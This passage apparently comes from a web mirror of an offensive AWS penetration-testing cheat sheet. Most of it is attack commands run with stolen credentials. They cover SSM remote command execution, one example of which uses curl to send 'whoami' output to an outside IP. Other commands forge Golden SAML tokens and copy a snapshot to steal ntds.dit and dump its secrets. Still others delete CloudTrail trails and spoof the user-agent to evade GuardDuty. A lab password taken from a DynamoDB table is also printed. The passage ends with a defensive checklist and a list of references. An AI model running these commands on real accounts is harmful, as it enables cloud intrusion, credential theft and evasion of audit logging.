</span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">ec2-instance-connect</span><span class="w"> </span><span class="nx">send-ssh-public-key</span><span class="w"> </span><span class="nt">--region</span><span class="w"> </span><span class="nx">us-east-1</span><span class="w"> </span><span class="nt">--instance-id</span><span class="w"> </span><span class="nx">INSTANCE</span><span class="w"> </span><span class="nt">--availability-zone</span><span class="w"> </span><span class="nx">us-east-1d</span><span class="w"> </span><span class="nt">--instance-os-user</span><span class="w"> </span><span class="nx">ubuntu</span><span class="w"> </span><span class="nt">--ssh-public-key</span><span class="w"> </span><span class="nx">file://shortkey.pub</span><span class="w"> </span><span class="nt">--profile</span><span class="w"> </span><span class="nx">uploadcreds</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="aws---lambda---extract-functions-code">AWS - Lambda - Extract function’s code</h2>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="c"># https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">lambda</span><span class="w"> </span><span class="nx">list-functions</span><span class="w"> </span><span class="nt">--profile</span><span class="w"> </span><span class="nx">uploadcreds</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">lambda</span><span class="w"> </span><span class="nx">get-function</span><span class="w"> </span><span class="nt">--function-name</span><span class="w"> </span><span class="s2">"LAMBDA-NAME-HERE-FROM-PREVIOUS-QUERY"</span><span class="w"> </span><span class="nt">--query</span><span class="w"> </span><span class="s1">'Code.Location'</span><span class="w"> </span><span class="nt">--profile</span><span class="w"> </span><span class="nx">uploadcreds</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">wget</span><span class="w"> </span><span class="nt">-O</span><span class="w"> </span><span class="nx">lambda-function.zip</span><span class="w"> </span><span class="nx">url-from-previous-query</span><span class="w"> </span><span class="nt">--profile</span><span class="w"> </span><span class="nx">uploadcreds</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="aws---ssm---command-execution">AWS - SSM - Command execution</h2>

<p>:warning: The ssm-user account is not removed from the system when SSM Agent is uninstalled.</p>

<p>SSM Agent is preinstalled, by default, on the following Amazon Machine Images (AMIs):</p>
<ul>
  <li>Windows Server 2008-2012 R2 AMIs published in November 2016 or later</li>
  <li>Windows Server 2016 and 2019</li>
  <li>Amazon Linux</li>
  <li>Amazon Linux 2</li>
  <li>Ubuntu Server 16.04</li>
  <li>Ubuntu Server 18.04</li>
  <li>Amazon ECS-Optimized</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">ssm</span><span class="w"> </span><span class="nx">describe-instance-information</span><span class="w"> </span><span class="nt">--profile</span><span class="w"> </span><span class="nx">stolencreds</span><span class="w"> </span><span class="nt">--region</span><span class="w"> </span><span class="nx">eu-west-1</span><span class="w">  
</span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">ssm</span><span class="w"> </span><span class="nx">send-command</span><span class="w"> </span><span class="nt">--instance-ids</span><span class="w"> </span><span class="s2">"INSTANCE-ID-HERE"</span><span class="w"> </span><span class="nt">--document-name</span><span class="w"> </span><span class="s2">"AWS-RunShellScript"</span><span class="w"> </span><span class="nt">--comment</span><span class="w"> </span><span class="s2">"IP Config"</span><span class="w"> </span><span class="nt">--parameters</span><span class="w"> </span><span class="nx">commands</span><span class="o">=</span><span class="n">ifconfig</span><span class="w"> </span><span class="nt">--output</span><span class="w"> </span><span class="nx">text</span><span class="w"> </span><span class="nt">--query</span><span class="w"> </span><span class="s2">"Command.CommandId"</span><span class="w"> </span><span class="nt">--profile</span><span class="w"> </span><span class="nx">stolencreds</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">ssm</span><span class="w"> </span><span class="nx">list-command-invocations</span><span class="w"> </span><span class="nt">--command-id</span><span class="w"> </span><span class="s2">"COMMAND-ID-HERE"</span><span class="w"> </span><span class="nt">--details</span><span class="w"> </span><span class="nt">--query</span><span class="w"> </span><span class="s2">"CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}"</span><span class="w"> </span><span class="nt">--profile</span><span class="w"> </span><span class="nx">stolencreds</span><span class="w">

</span><span class="n">e.g:</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="nx">aws</span><span class="w"> </span><span class="nx">ssm</span><span class="w"> </span><span class="nx">send-command</span><span class="w"> </span><span class="nt">--instance-ids</span><span class="w"> </span><span class="s2">"i-05b████████adaa"</span><span class="w"> </span><span class="nt">--document-name</span><span class="w"> </span><span class="s2">"AWS-RunShellScript"</span><span class="w"> </span><span class="nt">--comment</span><span class="w"> </span><span class="s2">"whoami"</span><span class="w"> </span><span class="nt">--parameters</span><span class="w"> </span><span class="nx">commands</span><span class="o">=</span><span class="s1">'curl 162.243.███.███:8080/`whoami`'</span><span class="w"> </span><span class="nt">--output</span><span class="w"> </span><span class="n">text</span><span class="w"> </span><span class="nt">--region</span><span class="o">=</span><span class="n">us-east-1</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="aws---golden-saml-attack">AWS - Golden SAML Attack</h2>

<p>https://www.youtube.com/watch?v=5dj4vOqqGZw  <br />
https://www.cyberark.com/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-cloud-apps/</p>

<blockquote>
  <p>Using the extracted information, the tool will generate a forged SAML token as an arbitrary user that can then be used to authenticate to Office 365 without knowledge of that user’s password. This attack also bypasses any MFA requirements.</p>
</blockquote>

<p>Requirement:</p>
<ul>
  <li>Token-signing private key (export from personal store using Mimikatz)</li>
  <li>IdP public certificate</li>
  <li>IdP name</li>
  <li>Role name (role to assume)</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">pip</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nx">boto3</span><span class="w"> </span><span class="nx">botocore</span><span class="w"> </span><span class="nx">defusedxml</span><span class="w"> </span><span class="nx">enum</span><span class="w"> </span><span class="nx">python_dateutil</span><span class="w"> </span><span class="nx">lxml</span><span class="w"> </span><span class="nx">signxml</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="o">.</span><span class="nx">\shimit.py</span><span class="w"> </span><span class="nt">-idp</span><span class="w"> </span><span class="nx">http://adfs.lab.local/adfs/services/trust</span><span class="w"> </span><span class="nt">-pk</span><span class="w"> </span><span class="nx">key_file</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">cert_file</span><span class="w">
</span><span class="nt">-u</span><span class="w"> </span><span class="n">domain\admin</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="nx">admin</span><span class="err">@</span><span class="nx">domain.com</span><span class="w"> </span><span class="nt">-r</span><span class="w"> </span><span class="nx">ADFS-admin</span><span class="w"> </span><span class="nt">-r</span><span class="w"> </span><span class="nx">ADFS-monitor</span><span class="w"> </span><span class="nt">-id</span><span class="w"> </span><span class="nx">123456789012</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="aws---shadow-copy-attack">AWS - Shadow Copy attack</h2>

<p>Prerequisite:</p>
<ul>
  <li>EC2:CreateSnapshot</li>
  <li>CloudCopy - https://github.com/Static-Flow/CloudCopy</li>
</ul>

<ol>
  <li>Load AWS CLI with Victim Credentials that have at least CreateSnapshot permissions</li>
  <li>Run <code class="language-plaintext highlighter-rouge">"Describe-Instances"</code> and show in list for attacker to select</li>
  <li>Run <code class="language-plaintext highlighter-rouge">"Create-Snapshot"</code> on volume of selected instance</li>
  <li>Run <code class="language-plaintext highlighter-rouge">"modify-snapshot-attribute"</code> on new snapshot to set <code class="language-plaintext highlighter-rouge">"createVolumePermission"</code> to attacker AWS Account</li>
  <li>Load AWS CLI with Attacker Credentials</li>
  <li>Run <code class="language-plaintext highlighter-rouge">"run-instance"</code> command to create new linux ec2 with our stolen snapshot</li>
  <li>Ssh run <code class="language-plaintext highlighter-rouge">"sudo mkdir /windows"</code></li>
  <li>Ssh run <code class="language-plaintext highlighter-rouge">"sudo mount /dev/xvdf1 /windows/"</code></li>
  <li>Ssh run <code class="language-plaintext highlighter-rouge">"sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user"</code></li>
  <li>Ssh run <code class="language-plaintext highlighter-rouge">"sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user"</code></li>
  <li>Ssh run <code class="language-plaintext highlighter-rouge">"sudo chown ec2-user:ec2-user /home/ec2-user/*"</code></li>
  <li>SFTP get <code class="language-plaintext highlighter-rouge">"/home/ec2-user/SYSTEM ./SYSTEM"</code></li>
  <li>SFTP get <code class="language-plaintext highlighter-rouge">"/home/ec2-user/ntds.dit ./ntds.dit"</code></li>
  <li>locally run <code class="language-plaintext highlighter-rouge">"secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets'</code>, expects secretsdump to be on path</li>
</ol>

<h2 id="disable-cloudtrail">Disable CloudTrail</h2>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">cloudtrail</span><span class="w"> </span><span class="nx">delete-trail</span><span class="w"> </span><span class="nt">--name</span><span class="w"> </span><span class="nx">cloudgoat_trail</span><span class="w"> </span><span class="nt">--profile</span><span class="w"> </span><span class="nx">administrator</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Disable monitoring of events from global services</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">cloudtrail</span><span class="w"> </span><span class="nx">update-trail</span><span class="w"> </span><span class="nt">--name</span><span class="w"> </span><span class="nx">cloudgoat_trail</span><span class="w"> </span><span class="nt">--no-include-global-service-event</span><span class="w"> 
</span></pre></td></tr></tbody></table></code></div></div>

<p>Disable Cloud Trail on specific regions</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">cloudtrail</span><span class="w"> </span><span class="nx">update-trail</span><span class="w"> </span><span class="nt">--name</span><span class="w"> </span><span class="nx">cloudgoat_trail</span><span class="w"> </span><span class="nt">--no-include-global-service-event</span><span class="w"> </span><span class="nt">--no</span><span class="o">-is</span><span class="nt">-multi-region</span><span class="w"> </span><span class="nt">--region</span><span class="o">=</span><span class="n">eu-west</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="cover-tracks-by-obfuscating-cloudtrail-logs-and-guard-duty">Cover tracks by obfuscating Cloudtrail logs and Guard Duty</h2>

<p>:warning: When using awscli on Kali Linux, Pentoo and Parrot Linux, a log is generated based on the user-agent.</p>

<p>Pacu bypass this problem by defining a custom User-Agent (https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu.py#L1473)</p>

<div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="n">boto3_session</span> <span class="o">=</span> <span class="n">boto3</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">ua</span> <span class="o">=</span> <span class="n">boto3_session</span><span class="p">.</span><span class="n">_session</span><span class="p">.</span><span class="n">user_agent</span><span class="p">()</span>
<span class="k">if</span> <span class="s">'kali'</span> <span class="ow">in</span> <span class="n">ua</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">or</span> <span class="s">'parrot'</span> <span class="ow">in</span> <span class="n">ua</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">or</span> <span class="s">'pentoo'</span> <span class="ow">in</span> <span class="n">ua</span><span class="p">.</span><span class="n">lower</span><span class="p">():</span>  <span class="c1"># If the local OS is Kali/Parrot/Pentoo Linux
</span>    <span class="c1"># GuardDuty triggers a finding around API calls made from Kali Linux, so let's avoid that...
</span>    <span class="bp">self</span><span class="p">.</span><span class="k">print</span><span class="p">(</span><span class="s">'Detected environment as one of Kali/Parrot/Pentoo Linux. Modifying user agent to hide that from GuardDuty...'</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="dynamodb">DynamoDB</h2>
<blockquote>
  <p>Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale. It’s a fully managed, multi-region, multi-active, durable database with built-in security, backup and restore, and in-memory caching for internet-scale applications. DynamoDB can handle more than 10 trillion requests per day and can support peaks of more than 20 million requests per second.</p>
</blockquote>

<ul>
  <li>list tables
```bash
$ aws –endpoint-url http://s3.bucket.htb dynamodb list-tables</li>
</ul>

<p>{
    “TableNames”: [
        “users”
    ]
}</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>
* enumerate table content
```bash
$ aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r '.Items[]'

{
  "password": {
    "S": "Management@#1@#"
  },
  "username": {
    "S": "Mgmt"
  }
}
</pre></td></tr></tbody></table></code></div></div>

<h2 id="security-checks">Security checks</h2>

<p>https://github.com/DenizParlak/Zeus</p>

<ul>
  <li>Identity and Access Management
    <ul>
      <li>Avoid the use of the “root” account</li>
      <li>Ensure multi-factor authentication (MFA) is enabled for all IAM users that have a console password</li>
      <li>Ensure credentials unused for 90 days or greater are disabled</li>
      <li>Ensure access keys are rotated every 90 days or less</li>
      <li>Ensure IAM password policy requires at least one uppercase letter</li>
      <li>Ensure IAM password policy requires at least one lowercase letter</li>
      <li>Ensure IAM password policy requires at least one symbol</li>
      <li>Ensure IAM password policy requires at least one number</li>
      <li>Ensure IAM password policy requires minimum length of 14 or greater</li>
      <li>Ensure no root account access key exists</li>
      <li>Ensure MFA is enabled for the “root” account</li>
      <li>Ensure security questions are registered in the AWS account</li>
      <li>Ensure IAM policies are attached only to groups or role</li>
      <li>Enable detailed billing</li>
      <li>Maintain current contact details</li>
      <li>Ensure security contact information is registered</li>
      <li>Ensure IAM instance roles are used for AWS resource access from instances</li>
    </ul>
  </li>
  <li>Logging
    <ul>
      <li>Ensure CloudTrail is enabled in all regions</li>
      <li>Ensure CloudTrail log file validation is enabled</li>
      <li>Ensure the S3 bucket CloudTrail logs to is not publicly accessible</li>
      <li>Ensure CloudTrail trails are integrated with CloudWatch Logs</li>
      <li>Ensure AWS Config is enabled in all regions</li>
      <li>Ensure S3 bucket access logging is enabled on the CloudTrail S3 bucket</li>
      <li>Ensure CloudTrail logs are encrypted at rest using KMS CMKs</li>
      <li>Ensure rotation for customer created CMKs is enabled</li>
    </ul>
  </li>
  <li>Networking
    <ul>
      <li>Ensure no security groups allow ingress from 0.0.0.0/0 to port 22</li>
      <li>Ensure no security groups allow ingress from 0.0.0.0/0 to port 3389</li>
      <li>Ensure VPC flow logging is enabled in all VPC</li>
      <li>Ensure the default security group of every VPC restricts all traffic</li>
    </ul>
  </li>
  <li>Monitoring
    <ul>
      <li>Ensure a log metric filter and alarm exist for unauthorized API calls</li>
      <li>Ensure a log metric filter and alarm exist for Management Consolesign-in without MFA</li>
      <li>Ensure a log metric filter and alarm exist for usage of “root” account</li>
      <li>Ensure a log metric filter and alarm exist for IAM policy changes</li>
      <li>Ensure a log metric filter and alarm exist for CloudTrail configuration changes</li>
      <li>Ensure a log metric filter and alarm exist for AWS Management Console authentication failures</li>
      <li>Ensure a log metric filter and alarm exist for disabling or scheduled deletion of customer created CMKs</li>
      <li>Ensure a log metric filter and alarm exist for S3 bucket policy changes</li>
      <li>Ensure a log metric filter and alarm exist for AWS Config configuration changes</li>
      <li>Ensure a log metric filter and alarm exist for security group changes</li>
      <li>Ensure a log metric filter and alarm exist for changes to NetworkAccess Control Lists (NACL)</li>
      <li>Ensure a log metric filter and alarm exist for changes to network gateways</li>
      <li>Ensure a log metric filter and alarm exist for route table changes</li>
      <li>Ensure a log metric filter and alarm exist for VPC changes</li>
    </ul>
  </li>
</ul>

<h2 id="references">References</h2>

<ul>
  <li><a href="https://www.gracefulsecurity.com/an-introduction-to-penetration-testing-aws/">An introduction to penetration testing AWS - Graceful Security</a></li>
  <li><a href="https://www.cyberark.com/threat-research-blog/cloud-shadow-admin-threat-10-permissions-protect/">Cloud Shadow Admin Threat 10 Permissions Protect - CyberArk</a></li>
  <li><a href="https://github.com/toniblyx/my-arsenal-of-aws-security-tools">My arsenal of AWS Security tools - toniblyx</a></li>
  <li><a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/">AWS Privilege Escalation method mitigation - RhinoSecurityLabs</a></li>
  <li><a href="https://gist.github.com/apolloclark/b3f60c1f68aa972d324b">AWS CLI Cheatsheet - apolloclark</a></li>
  <li><a href="https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/">Pacu Open source AWS Exploitation framework - RhinoSecurityLabs</a></li>
  <li><a href="https://www.youtube.com/watch?v=XfetW1Vqybw&amp;feature=youtu.be&amp;list=PLBID4NiuWSmfdWCmYGDQtlPABFHN7HyD5">PACU Spencer Gietzen - 30 juil. 2018</a></li>
  <li><a href="https://pumascan.com/resources/cloud-security-instance-metadata/">Cloud security instance metadata - PumaScan</a></li>
  <li><a href="https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6">Privilege escalation in the Cloud: From SSRF to Global Account Administrator - Maxime Leblanc - Sep 1, 2018</a></li>
  <li><a href="https://www.magnussen.funcmylife.fr/article_35">AWS - Cheatsheet - @Magnussen</a></li>
  <li><a href="https://github.com/awsdocs/amazon-guardduty-user-guide/blob/master/doc_source/guardduty_pentest.md">amazon-guardduty-user-guide PenTest Finding Types - @awsdocs</a></li>
  <li><a href="https://www.secsignal.org/en/news/how-i-hacked-a-whole-ec2-network-during-a-penetration-test/">HOW I HACKED A WHOLE EC2 NETWORK DURING A PENETRATION TEST - by Federico Fernandez</a></li>
  <li><a href="https://devopscube.com/mount-ebs-volume-ec2-instance/">How to Attach and Mount an EBS volume to EC2 Linux Instance - AUGUST 17, 2016</a></li>
  <li><a href="https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed">Getting shell and data access in AWS by chaining vulnerabilities - Riyaz Walikar - Aug 29, 2019 </a></li>
  <li><a href="https://blog.appsecco.com/getting-started-with-version-2-of-aws-ec2-instance-metadata-service-imdsv2-2ad03a1f3650">Getting started with Version 2 of AWS EC2 Instance Metadata service (IMDSv2) - Sunesh Govindaraj - Nov 25, 2019</a></li>
  <li><a href="https://blog.netspi.com/gaining-aws-console-access-via-api-keys/">Gaining AWS Console Access via API Keys - Ian Williams - March 18th, 2020</a></li>
  <li><a href="https://gist.github.com/kmcquade/33860a617e651104d243c324ddf7992a">AWS API calls that return credentials - kmcquade</a></li>
</ul>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/methodology-and-resource/'>Methodology and Resource</a>,
            <a href='/categories/cloud/'>Cloud</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/aws/"
            class="post-tag no-text-decoration" >AWS</a>
          
          <a href="/tags/cloud/"
            class="post-tag no-text-decoration" >Cloud</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=AWS - PayloadsAllTheThings&url=http://localhost:4000/Cloud-AWS-Pentest/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=AWS - PayloadsAllTheThings&u=http://localhost:4000/Cloud-AWS-Pentest/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=AWS - PayloadsAllTheThings&url=http://localhost:4000/Cloud-AWS-Pentest/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
